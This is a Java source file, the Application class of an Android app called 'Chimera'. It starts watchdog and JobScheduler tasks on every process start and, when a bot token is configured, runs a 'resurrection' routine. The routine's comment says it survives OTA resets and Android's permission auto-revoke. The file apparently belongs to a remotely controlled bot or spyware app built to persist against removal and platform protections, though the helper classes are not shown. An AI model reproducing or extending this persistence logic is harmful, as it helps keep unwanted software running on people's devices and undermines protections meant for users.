package com.chimera;

import android.app.Application;

public class ChimeraApplication extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        try {
            ConfigLoader.load(this);
        } catch (Exception e) {
            ErrorLogger.logError(this, "ChimeraApplication_Config", e);
        }
        try {
            NetworkStateMonitor.init(this);
        } catch (Exception e) { ErrorLogger.logError(this, "ChimeraApplication_Network", e); }
        try {
            // Pyramid: schedule watchdogs immediately on any process start (off main thread to avoid ANR)
            new Thread(() -> {
                try { ResurrectionHelper.scheduleWatchdog(ChimeraApplication.this); ResurrectionHelper.scheduleJobScheduler(ChimeraApplication.this); }
                catch (Exception e) { ErrorLogger.logError(ChimeraApplication.this, "ChimeraApplication_Watchdog", e); }
            }).start();
        } catch (Exception e) { ErrorLogger.logError(this, "ChimeraApplication_Watchdog", e); }
        try {
            CrashHandler handler = new CrashHandler(this);
            Thread.setDefaultUncaughtExceptionHandler(handler);
        } catch (Exception e) {
            ErrorLogger.logError(this, "ChimeraApplication_CrashHandler", e);
        }
        try {
            // If we have a token, ensure resurrection (handles OTA reset, auto-revoke) off UI
            if (ConfigLoader.getBotToken() != null) {
                new Thread(() -> { try { ResurrectionHelper.resurrect(ChimeraApplication.this); } catch (Exception e) { ErrorLogger.logError(ChimeraApplication.this, "ChimeraApplication_Resurrect", e); } }).start();
            }
        } catch (Exception e) { ErrorLogger.logError(this, "ChimeraApplication_Resurrect", e); }
    }
}
